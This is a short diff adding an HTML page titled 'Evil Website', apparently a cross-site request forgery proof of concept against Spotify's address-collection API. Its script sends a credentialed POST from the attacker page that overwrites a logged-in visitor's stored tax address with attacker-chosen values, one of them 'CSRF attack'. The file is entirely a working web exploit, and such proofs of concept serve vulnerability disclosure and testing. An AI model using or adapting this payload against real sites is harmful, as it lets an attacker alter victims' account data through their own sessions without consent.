@@ -1,0 +1,29 @@
+<html>
+<body>
+<h1>Evil Website<h1>
+
+<script>
+fetch("https://www.spotify.com/api/commerce-address-collection-service/spotify.addresscollection.v1.AddressCollectionService/SubmitForm", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "text/plain"
+  },
+  body: JSON.stringify({
+    details:{
+      configurationType:"tax",
+      country:"US",
+      locale:"en_US"
+    },
+    fieldValues:[
+      {id:"street",value:"CSRF attack"},
+      {id:"city",value:"San Diego"},
+      {id:"state",value:"CA"},
+      {id:"postal_code_short",value:"92101"}
+    ]
+  })
+});
+</script>
+
+</body>
+</html>
